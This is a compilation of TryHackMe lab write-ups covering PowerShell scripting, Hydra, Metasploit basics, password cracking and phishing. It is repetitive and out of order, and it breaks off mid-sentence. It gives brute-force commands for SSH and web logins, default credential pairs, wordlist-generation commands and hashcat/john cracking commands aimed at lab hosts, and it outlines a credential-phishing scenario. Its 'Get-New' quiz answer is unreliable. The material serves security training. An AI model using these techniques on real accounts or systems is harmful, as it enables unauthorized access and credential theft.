other(and themselves). Answer the following questions with regard to these emails (try not to open the files and use a script to answer the questions). Scripting may be a bit difficult, but here is a good resource to use: Answer the questions below What file contains the password Answer Explain Doc3M We use select-string -pattern password command to solve this chall.

Answer Explain Doc2Mary Task 6: Intermediate Scripting \u00b6 Content Now that you've learnt a little bit about how scripting works - let's try something a bit more interesting. Sometimes we may not have utilities like Nmap and Python available, and we are forced to write scripts to do very rudimentary tasks. Why don't you try writing a simple port scanner using Powershell? Here's the general approach to use: Determine IP ranges to scan(in this case it will be localhost) and you can provide the input in any way you want Determine the port ranges to scan Determine the type of scan to run(in this case it will be a simple TCP Connect Scan) Answer the questions below How many open ports did you find between 130 and 140(inclusive of those two)? Answer Explain 11 Use Test-Netconnection command to test connection.

This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object-oriented. This also means that running cmdlets allows you to perform actions on the output object (which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun ; for example, the cmdlet to list commands is called Get-Command Common verbs to use include: Get Start Stop Read Write New Out To get the complete list of approved verbs, visit this link. Answer the questions below What is the command to get a new object? Get-New To see the usage of a cmdlet we use the syntax Get-Help + <name of cmdlet> -Examples .

If we want to manipulate the output, we need to figure out a few things: passing the output to other cmdlets using specific object cmdlets to extract information The Pipeline( | ) is used to pass output from one cmdlet to another. A major difference compared to other shells is that Powershell passes an object to the next cmdlet instead of passing text or string to the command after the pipe. Like every object in object-oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet, and you can think of properties as variables in the output from a cmdlet.

For this ask, we'll use Powershell ISE (the Powershell Text Editor). Let's use a particular scenario to show an example of this script. Given a list of port numbers, we want to use this list to see if the local port is listening. Open the listening-ports.ps1 script on the Desktop using Powershell ISE. Powershell scripts usually have the .ps1 file extension. $system_ports = Get-NetTCPConnection -State Listen $text_port = Get-Content -Path C :\\ Users \\ Administrator \\ Desktop \\ ports . txt foreach ( $port in $text_port ){ if ( $port -in $system_ports . LocalPort ){ echo $port } } On the first line, we want to get a list of all the ports on the system that are listening. We do this using the Get-NetTCPConnection cmdlet. We are then saving the output of this cmdlet into a variable. The convention to create variables is used as: $variable_name = value In the following line, we want to read a list of ports from the file. We do this using the Get-Content cmdlet. Again, we store this output in the variables. The simplest next step is to iterate through all the ports in the file to see if the ports are listening. To iterate through the ports in the file, we use the following: foreach ( $new_var in $existing_var ){} This particular code block is used to loop through a set of objects. Once we have each individual port, we want to check if this port occurs in the listening local ports. Instead of doing another for loop, we just use an if statement with the -in operator to check if the port exists in the LocalPort property of any object. A full list of if statement comparison operators can be found here. To run the script, call the script path using Powershell or click the green button on Powershell ISE: Image title Now that we've seen what a basic script looks like - it's time to write one of your own.

Hydra can run through a list and \u201cbrute force\u201d some authentication services. Imagine trying to manually guess someone\u2019s password on a particular service ( SSH , Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password. According to its official repository , Hydra supports, i.e., has the ability to brute force the following protocols: \u201cAsterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.\u201d For more information on the options of each protocol in Hydra , you can check the Kali Hydra tool page . This shows the importance of using a strong password; if your password is common, doesn\u2019t contain special characters and is not above eight characters, it will be prone to be guessed. A one-hundred-million-password list contains common passwords, so when an out-of-the-box application uses an easy password to log in, change it from the default! CCTV cameras and web frameworks often use admin:password as the default login credentials, which is obviously not strong enough. Installing Hydra \u00b6 Hydra is already installed on the AttackBox. You can access it by clicking on the Start AttackBox button. If you prefer to use the in-browser Kali machine, Hydra also comes pre-installed, as is the case with all Kali distributions. You can access it by selecting Use Kali Linux and clicking on Start Kali Linux button. However, you can check its official repositories if you prefer to use another Linux distribution. For instance, you can install Hydra on an Ubuntu or Fedora system by executing apt install hydra or dnf install hydra . Furthermore, you can download it from its official THC- Hydra repository . Task 2: Using Hydra \u00b6 Deploy the machine attached to this task, then navigate to http://MACHINE_IP (this machine can take up to 3 minutes to boot) Hydra Commands \u00b6 The options we pass into Hydra depend on which service (protocol) we\u2019re attacking. For example, if we wanted to brute force FTP with the username being user and a password list being passlist.txt, we\u2019d use the following command: hydra -l user -P passlist.txt ftp://MACHINE_IP For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method). SSH \u00b6 hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh Option Description -l specifies the ( SSH ) username for login -P indicates a list of passwords -t sets the number of threads to spawn For example, hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh will run with the following arguments: Hydra will use root as the username for ssh It will try the passwords in the passwords.txt file There will be four threads running in parallel as indicated by -t 4 Post Web Form \u00b6 We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser\u2019s network tab (in developer tools) to see the request types or view the source code. sudo hydra <username> <wordlist> MACHINE_IP http-post-form \"<path>:<login_credentials>:<invalid_response>\" Option Description -l the username for (web form) login -P the password list to use http-post-form the type of the form is POST <path> the login page URL, for example, login.php <login_credentials> the username and password used to log in, for example, username=^USER^&password=^PASS^ <invalid_response> part of the response when the login fails -V verbose output for every attempt Below is a more concrete example Hydra command to brute force a POST login form: hydra -l <username> -P <wordlist> MACHINE_IP http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V The login page is only / , i.e., the main IP address. The username is the form field where the username is entered The specified username(s) will replace ^USER^ The password is the form field where the password is entered The provided passwords will be replacing ^PASS^ Finally, F=incorrect is a string that appears in the server reply when the login fails You should now have enough information to put this to practice and brute force your credentials to the deployed machine!

Learn how to use it and unlock its full potential. The Metasploit framework is a set of open-source tools used for network enumeration, identifying vulnerabilities, developing payloads and executing exploit code against remote target machines. Get hands-on with the various tool and features Metasploit provides, from exploit development to post-exploitation techniques, this module covers it all. Task 1: Introduction to Metasploit \u00b6 Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation. Metasploit has two main versions: Metasploit Pro : The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI). Metasploit Framework : The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions. The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development. The main components of the Metasploit Framework can be summarized as follows; msfconsole : The main command-line interface. Modules : supporting modules such as exploits, scanners, payloads, etc. Tools : Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module. This room will cover the main components of Metasploit while providing you with a solid foundation on how to find relevant exploits, set parameters, and exploit vulnerable services on the target system. Once you have completed this room, you will be able to navigate and use the Metasploit command line comfortably. You can deploy and use the AttackBox to complete tasks and answer the questions. Answer the questions below No answer needed Answer Explain No answer needed No answer needed Task 2: Main Components of Metasploit \u00b6 While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the msfconsole command. The console will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack. Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload. Exploit : A piece of code that uses a vulnerability present on the target system. Vulnerability : A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system. Payload : An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system. Modules and categories under each one are listed below.

Metasploit Framework : The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions. The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development. The main components of the Metasploit Framework can be summarized as follows; msfconsole : The main command-line interface. Modules : supporting modules such as exploits, scanners, payloads, etc. Tools : Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.

Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload. Exploit : A piece of code that uses a vulnerability present on the target system. Vulnerability : A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system. Payload : An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload.

We will discuss the ways to get and generate custom password lists. The following are some of the topics we will discuss: Password profiling Password attacks techniques Online password attacks What is a password? \u00b6 Passwords are used as an authentication method for individuals to access computer systems or applications. Using passwords ensures the owner of the account is the only one who has access. However, if the password is shared or falls into the wrong hands, unauthorized changes to a given system could occur. Unauthorized access could potentially lead to changes in the system's overall status and health or damage the file system. Passwords are typically comprised of a combination of characters such as letters, numbers, and symbols. Thus, it is up to the user how they generate passwords! A collection of passwords is often referred to as a dictionary or wordlist. Passwords with low complexity that are easy to guess are commonly found in various publicly disclosed password data breaches. For example, an easy-to-guess password could be password , 123456 , 111111 , and much more. Here are the top 100 and most common and seen passwords for your reference. Thus, it won't take long and be too difficult for the attacker to run password attacks against the target or service to guess the password. Choosing a strong password is a good practice, making it hard to guess or crack. Strong passwords should not be common words or found in dictionaries as well as the password should be an eight characters length at least. It also should contain uppercase and lower case letters, numbers, and symbol strings (ex: *&^%$#@ ). Sometimes, companies have their own password policies and enforce users to follow guidelines when creating passwords. This helps ensure users aren't using common or weak passwords within their organization and could limit attack vectors such as brute-forcing. For example, a password length has to be eight characters and more, including characters, a couple of numbers, and at least one symbol. However, if the attacker figures out the password policy, he could generate a password list that satisfies the account password policy. How secure are passwords? \u00b6 Passwords are a protection method for accessing online accounts or computer systems. Passwords authentication methods are used to access personal and private systems, and its main goal of using the password is to keep it safe and not share it with others. To answer the question: How secure are passwords? depends on various factors. Passwords are usually stored within the file system or database, and keeping them safe is essential. We've seen cases where companies store passwords into plaintext documents, such as the Sony breach in 2014. Therefore, once an attacker accesses the file system, he can easily obtain and reuse these passwords. On the other hand, others store passwords within the system using various techniques such as hashing functions or encryption algorithms to make them more secure. Even if the attacker has to access the system, it will be harder to crack. We will cover cracking hashes in the upcoming tasks. Answer the questions below Learn about password attacking techniques in the next task! Answer No needed answer Task 2: Password Attacking Techniques \u00b6 Alt text Password Attack Techniques \u00b6 In this room, we will discuss the techniques that could be used to perform password attacks. We will cover various techniques such as a dictionary, brute-force, rule-base, and guessing attacks. All the above techniques are considered active 'online' attacks where the attacker needs to communicate with the target machine to obtain the password in order to gain unauthorized access to the machine. Password Cracking vs. Password Guessing \u00b6 This section discusses password cracking terminology from a cybersecurity perspective. Also, we will discuss significant differences between password cracking and password guessing. Finally, we'll demonstrate various tools used for password cracking, including Hashcat and John the Ripper . Password cracking is a technique used for discovering passwords from encrypted or hashed data to plaintext data. Attackers may obtain the encrypted or hashed passwords from a compromised computer or capture them from transmitting data over the network. Once passwords are obtained, the attacker can utilize password attacking techniques to crack these hashed passwords using various tools. Password cracking is considered one of the traditional techniques in pen-testing. The primary goal is to let the attacker escalate to higher privileges and access to a computer system or network. Password guessing and password cracking are often commonly used by information security professionals. Both have different meanings and implications. Password guessing is a method of guessing passwords for online protocols and services based on dictionaries. The following are major differences between password cracking and password guessing: Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely. Password cracking is a technique performed locally or on systems controlled by the attacker. Answer the questions below Which type of password attack is performed locally? Answer Explain Password cracking Password cracking is a technique performed locally or on systems controlled by the attacker. Task 3: Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists \u00b6 Having a good wordlist is critical to carrying out a successful password attack. It is important to know how you can generate username lists and password lists. In this section, we will discuss creating targeted username and password lists. We will also cover various topics, including default, weak, leaked passwords, and creating targeted wordlists. Default Passwords \u00b6 Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers don't change the default password, which makes the system vulnerable. Thus, it is a good practice to try out admin:admin , admin:123456 , etc. If we know the target device, we can look up the default passwords and try them out. For example, suppose the target server is a Tomcat, a lightweight, open-source Java application server. In that case, there are a couple of possible default passwords we can try: admin:admin or tomcat:admin . Here are some website lists that provide default passwords for various products. https://cirt.net/passwords https://default-password.info/ https://datarecovery.com/rd/default-passwords/ Weak Passwords \u00b6 Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Here are some of the common weak passwords lists : https://wiki.skullsecurity.org/index.php?title=Passwords - This includes the most well-known collections of passwords. SecLists - A huge collection of all kinds of lists, not only for password cracking. Leaked Passwords \u00b6 Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as 'dumps'. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. The following are some of the common password lists that have weak and leaked passwords, including webhost , elitehacker , hak5 , Hotmail , PhpBB companies' leaks: SecLists/Passwords/Leaked-Databases Combined wordlists \u00b6 Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using cat : cewl cat file1 . txt file2 . txt file3 . txt > combined_list . txt To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows: cewl sort combined_list . txt | uniq -u > cleaned_combined_list . txt Customized Wordlists \u00b6 Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a company's website contains valuable information about the company and its employees, including emails and employee names. In addition, the website may contain keywords specific to what the company offers, including product and service names, which may be used in an employee's password! Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below cewl user @thm $ cewl -w list . txt -d 5 -m 5 http :// thm . labs -w will write the contents to a file. In this case, list.txt. -m 5 gathers strings (words) that are 5 characters or more -d 5 is the depth level of web crawling/spidering (default 2) http://thm.labs is the URL that will be used As a result, we should now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames. Apply what we discuss using cewl against https://clinic.thmredteam.com/ to parse all words and generate a wordlist with a minimum length of 8. Note that we will be using this wordlist later on with another task! Username Wordlists \u00b6 Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a {first name} {last name} (ex: John Smith) and a method of generating usernames. {first name} : john {last name} : smith {first name}{last name} : johnsmith {last name}{first name} : smithjohn first letter of the {first name}{last name} : jsmith first letter of the {last name}{first name} : sjohn first letter of the {first name}.{last name} : j.smith first letter of the {first name}-{last name} : j-smith and so on Thankfully, there is a tool username_generator that could help create a list with most of the possible combinations if we have a first name and last name.

Answer netscreen : netscreen Task 4: Password Profiling #2 - Keyspace Technique and CUPP \u00b6 Keyspace Technique \u00b6 Another way of preparing a wordlist is by using the key-space technique. In this technique, we specify a range of characters, numbers, and symbols in our wordlist. crunch is one of many powerful tools for creating an offline wordlist. With crunch , we can specify numerous options, including min, max, and options as follows: crunch user @thm $ crunch -h crunch version 3 . 6 Crunch can create a wordlist based on the criteria you specify . The output from crunch can be sent to the screen , file , or to another program . Usage : crunch [options] where min and max are numbers Please refer to the man page for instructions and examples on how to use crunch . The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to. crunch user @thm $ crunch 2 2 01234abcd -o crunch . txt Crunch will now generate the following amount of data : 243 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines : xx crunch : 100 % completed generating output Here is a snippet of the output: crunch user @thm $ cat crunch . txt 00 01 02 03 04 0a 0b 0c 0d 10 . . . cb cc cd d0 d1 d2 d3 d4 da db dc dd It's worth noting that crunch can generate a very large text file depending on the word length and combination options you specify. The following command creates a list with an 8 character minimum and maximum length containing numbers 0-9, a-f lowercase letters, and A-F uppercase letters: crunch 8 8 0123456789abcdefABCDEF -o crunch.txt the file generated is 459 GB and contains 54875873536 words. crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice: @ - lower case alpha characters , - upper case alpha characters % - numeric characters ^ - special characters including space For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers: crunch user @thm $ crunch 6 6 -t pass %% Crunch will now generate the following amount of data : 700 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines : 100 pass00 pass01 pass02 pass03 CUPP - Common User Passwords Profiler \u00b6 CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information. CUPP will take the information supplied and generate a custom wordlist based on what's provided. There's also support for a 1337/leet mode , which substitutes the letters a, i,e, t, o, s, g, z with numbers. For example, replace a with 4 or i with 1. For more information about the tool, please visit the GitHub repo here . To run CUPP, we need python 3 installed. Then clone the GitHub repo to your local machine using git as follows: CUPP user @thm $ git clone https :// github . com / Mebus / cupp . git Cloning into 'cupp' ... remote : Enumerating objects : 237 , done . remote : Total 237 ( delta 0 ), reused 0 ( delta 0 ), pack-reused 237 Receiving objects : 100 % ( 237 / 237 ), 2 . 14 MiB | 1 . 32 MiB / s , done .

How many words did crunch generate? Answer 81 Task 5: Offline Attacks - Dictionary and Brute-Force \u00b6 This section discusses offline attacks, including dictionary, brute-force, and rule-based attacks. Dictionary attack \u00b6 A dictionary attack is a technique used to guess passwords by using well-known words or phrases. The dictionary attack relies entirely on pre-gathered wordlists that were previously generated or found. It is important to choose or create the best candidate wordlist for your target in order to succeed in this attack. Let's explore performing a dictionary attack using what you've learned in the previous tasks about generating wordlists. We will showcase an offline dictionary attack using hashcat , which is a popular tool to crack hashes. Let's say that we obtain the following hash f806fc5a2a0d5ba2471600758452799c , and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum: 1- What type of hash is this? 2- What wordlist will we be using? Or what type of attack mode could we use? To identify the type of hash, we could a tool such as hashid or hash-identifier . For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU). Dictionary attack user @machine $ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c / usr / share / wordlists / rockyou . txt hashcat ( v6 . 1 . 1 ) starting ... f806fc5a2a0d5ba2471600758452799c : rockyou Session ..........: hashcat Status ...........: Cracked Hash .

Brute-Force attack \u00b6 Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords. In contrast, a brute-force attack aims to try all combinations of a character or characters. For example, let's assume that we have a bank account to which we need unauthorized access. We know that the PIN contains 4 digits as a password. We can perform a brute-force attack that starts from 0000 to 9999 to guess the valid PIN based on this knowledge. In other cases, a sequence of numbers or letters can be added to existing words in a list, such as admin0 , admin1 , .. admin9999 . For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options. Brute-Force attack user @machine $ hashcat - -help ? | Charset ===+========= l | abcdefghijklmnopqrstuvwxyz u | ABCDEFGHIJKLMNOPQRSTUVWXYZ d | 0123456789 h | 0123456789abcdef H | 0123456789ABCDEF s | ! \"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ a | ?l?u?d?s b | 0x00 - 0xff The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice. Brute-Force attack user @machine $ hashcat -a 3 ? d ? d ? d ? d - -stdout 1234 0234 2234 3234 9234 4234 5234 8234 7234 6234 .. .. -a 3 sets the attacking mode as a brute-force attack ?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999 --stdout print the result to the terminal Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number. Brute-Force attack user @machine $ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ? d ? d ? d ? d 05a5cf06982ba7892ed2a6d38fe832d6 : 2021 Session ..........: hashcat Status ...........: Cracked Hash .

Note the password is a 4 digit number: [0-9][0-9][0-9][0-9] Answer 1337 Task 6: Offline Attacks - Rule-Based \u00b6 Rule-Based attacks \u00b6 Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy \u2014 for example, manipulating or 'mangling' a password such as 'password': p@ssword, Pa$$word, Passw0rd, and so on. For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules: Rule-based attack user @machine $ cat / etc / john / john . conf | grep \"List.Rules:\" | cut -d \".\" -f3 | cut -d \":\" -f2 | cut -d \"]\" -f1 | awk NF JumboSingle o1 o2 i1 i2 o1 i1 o2 i2 best64 d3ad0ne dive InsidePro T0XlC rockyou - 30000 specific ShiftToggle Split Single Extra OldOffice Single-Extra Wordlist ShiftToggle Multiword best64 Jumbo KoreLogic T9 We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string tryhackme , to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do! Rule-based attack user @machine $ john - -wordlist =/ tmp / single-password-list . txt - -rules = best64 - -stdout | wc -l Using default input encoding : UTF - 8 Press 'q' or Ctrl-C to abort , almost any other key for status 76p 0 : 00 : 00 : 00 100 . 00 % ( 2021 - 10 - 11 13 : 42 ) 1266p / s pordpo 76 --wordlist= to specify the wordlist or dictionary file. --rules to specify which rule or rules to use. --stdout to print the output to the terminal. |wc -l to count how many lines John produced. By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic . KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website here . Now let's use this rule and check whether the Tryh@ckm3 is available in our list!

Using passwords ensures the owner of the account is the only one who has access. However, if the password is shared or falls into the wrong hands, unauthorized changes to a given system could occur. Unauthorized access could potentially lead to changes in the system's overall status and health or damage the file system. Passwords are typically comprised of a combination of characters such as letters, numbers, and symbols. Thus, it is up to the user how they generate passwords! A collection of passwords is often referred to as a dictionary or wordlist. Passwords with low complexity that are easy to guess are commonly found in various publicly disclosed password data breaches. For example, an easy-to-guess password could be password , 123456 , 111111 , and much more. Here are the top 100 and most common and seen passwords for your reference. Thus, it won't take long and be too difficult for the attacker to run password attacks against the target or service to guess the password. Choosing a strong password is a good practice, making it hard to guess or crack. Strong passwords should not be common words or found in dictionaries as well as the password should be an eight characters length at least. It also should contain uppercase and lower case letters, numbers, and symbol strings (ex: *&^%$#@ ). Sometimes, companies have their own password policies and enforce users to follow guidelines when creating passwords. This helps ensure users aren't using common or weak passwords within their organization and could limit attack vectors such as brute-forcing. For example, a password length has to be eight characters and more, including characters, a couple of numbers, and at least one symbol. However, if the attacker figures out the password policy, he could generate a password list that satisfies the account password policy.","title":"What is a password?"},{"location":"tryhackme/room/password-attacks/#how-secure-are-passwords","text":"Passwords are a protection method for accessing online accounts or computer systems. Passwords authentication methods are used to access personal and private systems, and its main goal of using the password is to keep it safe and not share it with others. To answer the question: How secure are passwords? depends on various factors. Passwords are usually stored within the file system or database, and keeping them safe is essential. We've seen cases where companies store passwords into plaintext documents, such as the Sony breach in 2014. Therefore, once an attacker accesses the file system, he can easily obtain and reuse these passwords. On the other hand, others store passwords within the system using various techniques such as hashing functions or encryption algorithms to make them more secure. Even if the attacker has to access the system, it will be harder to crack. We will cover cracking hashes in the upcoming tasks.

Also, we will discuss significant differences between password cracking and password guessing. Finally, we'll demonstrate various tools used for password cracking, including Hashcat and John the Ripper . Password cracking is a technique used for discovering passwords from encrypted or hashed data to plaintext data. Attackers may obtain the encrypted or hashed passwords from a compromised computer or capture them from transmitting data over the network. Once passwords are obtained, the attacker can utilize password attacking techniques to crack these hashed passwords using various tools. Password cracking is considered one of the traditional techniques in pen-testing. The primary goal is to let the attacker escalate to higher privileges and access to a computer system or network. Password guessing and password cracking are often commonly used by information security professionals. Both have different meanings and implications. Password guessing is a method of guessing passwords for online protocols and services based on dictionaries. The following are major differences between password cracking and password guessing: Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely. Password cracking is a technique performed locally or on systems controlled by the attacker.

For example, suppose the target server is a Tomcat, a lightweight, open-source Java application server. In that case, there are a couple of possible default passwords we can try: admin:admin or tomcat:admin .

Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below cewl user @thm $ cewl -w list . txt -d 5 -m 5 http :// thm . labs -w will write the contents to a file. In this case, list.txt. -m 5 gathers strings (words) that are 5 characters or more -d 5 is the depth level of web crawling/spidering (default 2) http://thm.labs is the URL that will be used As a result, we should now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo.

This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords. In contrast, a brute-force attack aims to try all combinations of a character or characters. For example, let's assume that we have a bank account to which we need unauthorized access. We know that the PIN contains 4 digits as a password. We can perform a brute-force attack that starts from 0000 to 9999 to guess the valid PIN based on this knowledge. In other cases, a sequence of numbers or letters can be added to existing words in a list, such as admin0 , admin1 , .. admin9999 . For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options.

Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy \u2014 for example, manipulating or 'mangling' a password such as 'password': p@ssword, Pa$$word, Passw0rd, and so on. For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules: Rule-based attack user @machine $ cat / etc / john / john . conf | grep \"List.Rules:\" | cut -d \".\" -f3 | cut -d \":\" -f2 | cut -d \"]\" -f1 | awk NF JumboSingle o1 o2 i1 i2 o1 i1 o2 i2 best64 d3ad0ne dive InsidePro T0XlC rockyou - 30000 specific ShiftToggle Split Single Extra OldOffice Single-Extra Wordlist ShiftToggle Multiword best64 Jumbo KoreLogic T9 We can see that we have many rules that are available for us to use.

Now it's time to move to the next task and receive your Intro to Phishing ! I'm ready to learn! No needed answer Task 2: Intro To Phishing Attacks \u00b6 Before you learn what phishing is, you'll need to understand the term social engineering. Social engineering is the psychological manipulation of people into performing or divulging information by exploiting weaknesses in human nature. These \"weaknesses\" can be curiosity, jealously, greed and even kindness and the willingness to help someone. Phishing is a source of social engineering delivered through email to trick someone into either revealing personal information, credentials or even executing malicious code on their computer. These emails will usually appear to come from a trusted source, whether that's a person or a business. They include content that tries to tempt or trick people into downloading software, opening attachments, or following links to a bogus website. A term you'll come across and the type of phishing campaign a red team would participate in is spear-phishing , as with throwing a physical spear; you'd have a target to aim at, the same can be said with spear-phishing in that you're targeting an individual, business or organisation rather than just anybody as mass. This is an effective form of phishing for a red team engagement as they are bespoke to the target it makes them hard to detect by technology such as spam filters, antivirus and firewalls. A red team could be contracted to solely carry out a phishing assessment to see whether a business is vulnerable to this type of attack or can also be part of a broader scale assessment and used to gain access to computer systems or services. Some other methods of phishing through other mediums are smishing which is phishing through SMS messages, and vishing which is performed through phone calls. Example Scenario: The below example scenario shows how an employee of a company could be tricked into revealing their credentials. 1) The attacker locates the physical location of the target business. 2) The attacker then looks for nearby food suppliers and discovers a company called Ultimate Cookies! 3) The Attacker registers the domain name ultimate-cookies.thm 4) The attacker then crafts an email to their target, tempting them with an offer of receiving some free cookies if they sign up to the website. Because the victim has heard of this local company, they are more likely to trust it. 5) The victim then follows the link in the email to the fake website created by the attacker and registers online. To keep things simple, the victim reuses the same password for all their online accounts. 6) The attacker now has the victim's email address and password and can log onto the victim's company email account. The attacker could now have access to private company 